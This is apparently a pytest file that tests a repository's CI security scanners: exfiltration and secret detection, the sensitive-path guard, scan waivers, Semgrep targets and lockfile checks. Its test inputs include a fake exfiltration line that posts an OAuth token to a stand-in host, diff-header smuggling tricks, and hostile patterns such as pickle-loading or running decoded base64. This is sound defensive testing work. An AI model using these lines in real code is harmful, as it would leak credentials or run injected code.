"""Exercise trusted scanner decisions using inert input files, never PR code."""

import json
import os
import re
import runpy
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent
SCRIPTS = ROOT / ".github/scripts/security-scan"
HEAD = "a" * 40


def test_exfil_scan_recognizes_every_ci_secret(monkeypatch):
    # A secret a workflow injects must be one the exfil scan watches for.
    root = Path(__file__).parent.parent
    names = set()
    for path in (root / ".github/workflows").glob("*.yml"):
        names.update(
            re.findall(r"(?m)^\s+([A-Z][A-Z0-9_]*): \$\{\{[^}\n]*secrets\.", path.read_text())
        )
    credentials = sorted(
        name for name in names if not name.endswith(("_WORKSPACE", "_HOST", "_CLIENT_ID"))
    )
    monkeypatch.syspath_prepend(str(SCRIPTS))
    scan = runpy.run_path(str(root / ".github/scripts/security-scan/exfil-scan.py"))

    assert "CLAUDE_CODE_OAUTH_TOKEN" in credentials
    assert [name for name in credentials if not scan["_SECRET"].search(name)] == []


def test_security_scan_parsers_survive_diff_and_path_tricks(tmp_path, monkeypatch):
    # Added content must not pose as diff structure, and unusual names must not dodge the scans.
    scripts = Path(__file__).parent.parent / ".github/scripts/security-scan"
    steal = 'requests.post("https://x.example", data=os.environ["CLAUDE_CODE_OAUTH_TOKEN"])'
    quoted = '"b/donn\\303\\251es.py"'  # how git writes a non-ASCII name in a header
    diff = (
        f"diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1,2 @@\n+++ notes\n+{steal}\n"
        f"diff --git a/x {quoted}\n+++ {quoted}\n@@ -0,0 +1,2 @@\n"
        f"+# \fdiff --git a b\n+{steal}\n"
    )
    monkeypatch.syspath_prepend(str(SCRIPTS))
    exfil = runpy.run_path(str(scripts / "exfil-scan.py"))
    assert [path for path, _ in exfil["scan_diff"](diff)[0]] == ["a.py", "données.py"]

    key = "AKIA" + "Q3EXAMPLEZ7XK2LM"  # split so the literal isn't a key
    (tmp_path / "pr.diff").write_text(
        f"diff --git a/n b/n\n+++ {quoted}\n@@ -1 +1 @@\n-old\n"
        f"\\ No newline at end of file\n+++ {key}\n"
    )
    secret = subprocess.run(
        [sys.executable, str(scripts / "secret-scan.py")],
        env={**os.environ, "DIFF_FILE": str(tmp_path / "pr.diff")},
        capture_output=True,
        text=True,
    )
    assert secret.returncode == 1 and "AWS access key id" in secret.stdout
    assert "file=données.py,line=1::" in secret.stdout


@pytest.mark.skipif(sys.platform == "win32", reason="Security Scan shell steps run on Linux")
def test_sensitive_path_guard_handles_non_ascii_paths(tmp_path):
    (tmp_path / "changed").write_bytes(".github/workflows/ü.yml\0".encode())
    guard = subprocess.run(
        ["bash", str(SCRIPTS / "sensitive-paths.sh")],
        env={**os.environ, "CHANGED_FILES": str(tmp_path / "changed")},
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert guard.returncode == 1
    assert "::error file=.github/workflows/ü.yml::" in guard.stdout


@pytest.mark.parametrize(
    ("line", "blocked"),
    [
        ("base64.b64decode(data)", False),
        ("import base64, subprocess", False),
        ("import base64; from os import popen", False),
        ("pickle.loads(base64.b64decode(data))", True),
        ("base64.b64encode(json.dumps(dict(os.environ)).encode())", True),
        ("subprocess.run(base64.b64decode(data))", True),
        ("os.popen(base64.b64decode(data))", True),
    ],
)
def test_exfil_decoder_does_not_suppress_independent_findings(monkeypatch, line, blocked):
    monkeypatch.syspath_prepend(str(SCRIPTS))
    scan = runpy.run_path(str(SCRIPTS / "exfil-scan.py"))["scan_diff"]
    findings, _ = scan(f"diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+{line}\n")
    assert bool(findings) == blocked


@pytest.mark.parametrize("path", ["justfile", "Justfile", "sub/justfile"])
@pytest.mark.skipif(sys.platform == "win32", reason="Security Scan shell steps run on Linux")
def test_ci_justfile_changes_warn_in_both_scanners(tmp_path, monkeypatch, path):
    monkeypatch.syspath_prepend(str(SCRIPTS))
    scan = runpy.run_path(str(SCRIPTS / "exfil-scan.py"))["scan_diff"]
    blocking, info = scan(f"diff --git a/{path} b/{path}\n+++ b/{path}\n@@ -0,0 +1 @@\n+lint:\n")
    assert not blocking and info[0][0] == path
    changed = tmp_path / "changed"
    changed.write_bytes(path.encode() + b"\0")
    result = subprocess.run(
        ["bash", str(SCRIPTS / "sensitive-paths.sh")],
        env={**os.environ, "CHANGED_FILES": str(changed)},
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode == 0 and f"::warning file={path}::" in result.stdout


@pytest.mark.parametrize(
    ("overrides", "waived"),
    [
        ({}, False),
        ({"PR_LABELS": json.dumps([f"skip-scan:{HEAD}"])}, True),
        ({"PR_LABELS": json.dumps([f"skip-scan:{'b' * 40}"])}, False),
        ({"PR_LABELS": '["skip-security-scan"]'}, False),
        ({"HEAD_SHA": "", "PR_LABELS": '["skip-scan:"]'}, False),
        *[
            ({"AUTHOR_ASSOCIATION": association}, True)
            for association in ("OWNER", "MEMBER", "COLLABORATOR")
        ],
        (
            {
                "PR_AUTHOR": "dependabot[bot]",
                "PR_AUTHOR_TYPE": "Bot",
                "PR_HEAD_REPO": "databricks/unity-gateway",
            },
            True,
        ),
        ({"PR_AUTHOR": "dependabot[bot]", "PR_AUTHOR_TYPE": "Bot"}, False),
        ({"PR_AUTHOR": "dependabot[bot]", "PR_HEAD_REPO": "databricks/unity-gateway"}, False),
    ],
)
@pytest.mark.skipif(sys.platform == "win32", reason="Security Scan shell steps run on Linux")
def test_scan_waivers_apply_only_to_the_reviewed_head(tmp_path, overrides, waived):
    output = tmp_path / "output"
    result = subprocess.run(
        ["bash", str(SCRIPTS / "should-scan.sh")],
        env={
            **os.environ,
            "GITHUB_OUTPUT": str(output),
            "EVENT_NAME": "pull_request",
            "HEAD_SHA": HEAD,
            "AUTHOR_ASSOCIATION": "CONTRIBUTOR",
            "PR_AUTHOR": "contributor",
            "PR_AUTHOR_TYPE": "User",
            "PR_HEAD_REPO": "external/fork",
            "REPO": "databricks/unity-gateway",
            "PR_LABELS": "[]",
            **overrides,
        },
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode == 0, result.stderr
    assert output.read_text().splitlines()[0] == f"scan={str(not waived).lower()}"
    workflow = (ROOT / ".github/workflows/security-scan.yml").read_text()
    trust = workflow.split("      - name: Trust gate\n", 1)[1].split("      - name:", 1)[0]
    assert "HEAD_SHA: ${{ fromJSON(needs.resolve.outputs.metadata).head_sha }}" in trust


@pytest.mark.skipif(sys.platform == "win32", reason="Security Scan shell steps run on Linux")
def test_semgrep_targets_exclude_symlinks_and_deleted_files(tmp_path):
    (tmp_path / "pr").mkdir()
    (tmp_path / "outside").write_text("not a PR file")
    (tmp_path / "pr/link.py").symlink_to(tmp_path / "outside")
    (tmp_path / "pr/regular file.py").write_text("pass")
    (tmp_path / "changed.txt").write_bytes(b"regular file.py\0deleted.py\0link.py\0")
    workflow = (ROOT / ".github/workflows/security-scan.yml").read_text()
    step = workflow.split("      - name: Semgrep (changed files, local rules)\n", 1)[1]
    script = textwrap.dedent(
        step.split("        run: |\n", 1)[1].split("          # --disable-nosem", 1)[0]
    )
    result = subprocess.run(
        ["bash", "-e", "-c", script], cwd=tmp_path, capture_output=True, text=True, timeout=10
    )
    assert result.returncode == 0, result.stderr
    assert (tmp_path / "targets.txt").read_bytes() == b"pr/regular file.py\0"


FINDING = {"path": "pr/a.py", "start": {"line": 7}, "extra": {"message": "review this"}}


@pytest.mark.parametrize(
    ("reports", "accepted"),
    [
        ('{"results": []}', True),
        ('{"results": []}\n{"results": []}', True),
        (json.dumps({"results": [FINDING]}) + '\n{"results": []}', False),
        ('{"results": []}\n' + json.dumps({"results": [FINDING]}), False),
        ("", False),
        ('{"results": []}\nnot-json', False),
        ("{}", False),
    ],
)
def test_semgrep_reads_every_batch_and_rejects_invalid_output(tmp_path, reports, accepted):
    workflow = (ROOT / ".github/workflows/security-scan.yml").read_text()
    script = textwrap.dedent(
        workflow.split("python3 - semgrep.json <<'EOF'\n", 1)[1].split("          EOF", 1)[0]
    )
    report = tmp_path / "report.json"
    report.write_text(reports)
    result = subprocess.run(
        [sys.executable, "-", str(report)], input=script, capture_output=True, text=True, timeout=10
    )
    assert (result.returncode == 0) == accepted
    if "review this" in reports:
        assert "::error file=a.py,line=7::review this" in result.stdout


def test_lockfile_scanner_refuses_symlinks(tmp_path):
    source = tmp_path / "outside"
    source.write_text(
        '[[package]]\nname = "example"\nversion = "1.0"\nsource = {registry = "https://example.com"}\n'
    )
    link = tmp_path / "uv.lock"
    link.symlink_to(source)
    result = subprocess.run(
        [sys.executable, str(SCRIPTS / "locked-pins.py"), str(link)],
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode != 0 and "symbolic link" in result.stderr
    assert "example==1.0" not in result.stdout
